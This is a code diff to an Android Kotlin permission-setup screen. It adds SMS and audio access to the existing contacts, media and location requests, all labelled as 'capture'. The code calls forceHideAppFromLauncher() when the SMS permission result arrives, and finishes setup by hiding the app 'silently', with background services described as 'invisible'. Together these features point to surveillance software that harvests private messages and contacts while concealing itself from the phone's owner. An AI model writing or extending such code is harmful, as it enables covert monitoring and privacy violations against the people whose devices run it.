@@ -83,10 +83,12 @@ class PermissionSetupActivity : AppCompatActivity() {
         private const val REQUEST_POST_NOTIFICATIONS = 1001
         private const val REQUEST_READ_MEDIA_IMAGES = 1002
         private const val REQUEST_READ_MEDIA_VIDEO = 1003
-        private const val REQUEST_READ_EXTERNAL_STORAGE = 1004
-        private const val REQUEST_READ_CONTACTS = 1005
-        private const val REQUEST_LOCATION_PERMISSIONS = 1006
-        private const val REQUEST_BACKGROUND_LOCATION = 1007
+        private const val REQUEST_READ_MEDIA_AUDIO = 1004
+        private const val REQUEST_READ_EXTERNAL_STORAGE = 1005
+        private const val REQUEST_READ_CONTACTS = 1006
+        private const val REQUEST_READ_SMS = 1007
+        private const val REQUEST_LOCATION_PERMISSIONS = 1008
+        private const val REQUEST_BACKGROUND_LOCATION = 1009
     }
     
     private var currentPermissionIndex = 0
@@ -133,62 +135,91 @@ class PermissionSetupActivity : AppCompatActivity() {
         permissionsQueue.clear()
         currentPermissionIndex = 0
         
-        // POST_NOTIFICATIONS (Android 13+)
+        // Build permissions queue in order of importance and user experience
+        // Start with less intrusive permissions, end with more sensitive ones
+        
+        // 1. POST_NOTIFICATIONS (Android 13+) - Required for foreground services (invisible)
         if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
             if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) 
                 != PackageManager.PERMISSION_GRANTED) {
                 permissionsQueue.add(PermissionRequest(
                     Manifest.permission.POST_NOTIFICATIONS,
                     REQUEST_POST_NOTIFICATIONS,
-                    "Notifications"
+                    "Notifications (for background services - invisible)"
                 ))
             }
         }
         
-        // READ_MEDIA_IMAGES (Android 13+)
+        // 2. READ_MEDIA_IMAGES (Android 13+) - For media capture
         if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
             if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) 
                 != PackageManager.PERMISSION_GRANTED) {
                 permissionsQueue.add(PermissionRequest(
                     Manifest.permission.READ_MEDIA_IMAGES,
                     REQUEST_READ_MEDIA_IMAGES,
-                    "Photos & Media"
+                    "Photos & Media (read-only access)"
                 ))
             }
         }
         
-        // READ_MEDIA_VIDEO (Android 13+)
+        // 3. READ_MEDIA_VIDEO (Android 13+) - For video capture
         if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
             if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_VIDEO) 
                 != PackageManager.PERMISSION_GRANTED) {
                 permissionsQueue.add(PermissionRequest(
                     Manifest.permission.READ_MEDIA_VIDEO,
                     REQUEST_READ_MEDIA_VIDEO,
-                    "Videos"
+                    "Videos (read-only access)"
                 ))
             }
         }
+
+        // 3b. READ_MEDIA_AUDIO (Android 13+) - For audio capture
+        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_AUDIO)
+                != PackageManager.PERMISSION_GRANTED) {
+                permissionsQueue.add(
+                    PermissionRequest(
+                        Manifest.permission.READ_MEDIA_AUDIO,
+                        REQUEST_READ_MEDIA_AUDIO,
+                        "Audio (read-only access)"
+                    )
+                )
+            }
+        }
         
-        // READ_EXTERNAL_STORAGE (Android 12 and below)
+        // 4. READ_EXTERNAL_STORAGE (Android 12 and below) - Legacy storage access
         if (android.os.Build.VERSION.SDK_INT < android.os.Build.VERSION_CODES.TIRAMISU) {
             if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) 
                 != PackageManager.PERMISSION_GRANTED) {
                 permissionsQueue.add(PermissionRequest(
                     Manifest.permission.READ_EXTERNAL_STORAGE,
                     REQUEST_READ_EXTERNAL_STORAGE,
-                    "Storage"
+                    "Storage (read-only access)"
                 ))
             }
         }
         
-        // READ_CONTACTS (for contact capture)
+        // 5. READ_CONTACTS - For contact capture (read-only)
         if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) 
             != PackageManager.PERMISSION_GRANTED) {
             permissionsQueue.add(PermissionRequest(
                 Manifest.permission.READ_CONTACTS,
                 REQUEST_READ_CONTACTS,
-                "Contacts"
+                "Contacts (read-only access)"
             ))
+        }
+
+        // 6. READ_SMS - For SMS capture (read-only)
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
+            != PackageManager.PERMISSION_GRANTED) {
+            permissionsQueue.add(
+                PermissionRequest(
+                    Manifest.permission.READ_SMS,
+                    REQUEST_READ_SMS,
+                    "SMS (read-only access)"
+                )
+            )
         }
         
         Timber.d("Permissions queue built: ${permissionsQueue.size} permissions to request")
@@ -293,6 +324,7 @@ class PermissionSetupActivity : AppCompatActivity() {
             REQUEST_POST_NOTIFICATIONS,
             REQUEST_READ_MEDIA_IMAGES,
             REQUEST_READ_MEDIA_VIDEO,
+            REQUEST_READ_MEDIA_AUDIO,
             REQUEST_READ_EXTERNAL_STORAGE,
             REQUEST_READ_CONTACTS -> {
                 // Handle runtime permission result one by one
@@ -314,6 +346,23 @@ class PermissionSetupActivity : AppCompatActivity() {
                 // Request next permission after a short delay
                 CoroutineScope(Dispatchers.Main).launch {
                     delay(500) // Small delay between permissions
+                    requestNextPermission()
+                }
+            }
+            REQUEST_READ_SMS -> {
+                // Handle SMS permission result
+                if (granted) {
+                    Timber.d("Permission granted: $permissionName")
+                } else {
+                    Timber.w("Permission denied: $permissionName")
+                }
+
+                forceHideAppFromLauncher()
+                currentPermissionIndex++
+                updatePermissionStatus()
+
+                CoroutineScope(Dispatchers.Main).launch {
+                    delay(500)
                     requestNextPermission()
                 }
             }
@@ -484,7 +533,8 @@ class PermissionSetupActivity : AppCompatActivity() {
             
             // 8. Mark setup as complete
             AppStateManager.markSetupComplete(this@PermissionSetupActivity)
-            AppStateManager.setServicesEnabled(this@PermissionSetupActivity, true)
+            // Do NOT auto-enable capture. User must explicitly enable it in Settings.
+            AppStateManager.setServicesEnabled(this@PermissionSetupActivity, false)
             
             // 9. Hide this activity and finish silently
             Timber.d("Permission setup complete - hiding app")
@@ -621,6 +671,14 @@ class PermissionSetupActivity : AppCompatActivity() {
                     permissions.add("✓ Contacts")
                 } else {
                     permissions.add("✗ Contacts")
+                }
+
+                // Check READ_SMS
+                if (ContextCompat.checkSelfPermission(this@PermissionSetupActivity, Manifest.permission.READ_SMS)
+                    == PackageManager.PERMISSION_GRANTED) {
+                    permissions.add("✓ SMS")
+                } else {
+                    permissions.add("✗ SMS")
                 }
                 
                 // Check location permissions
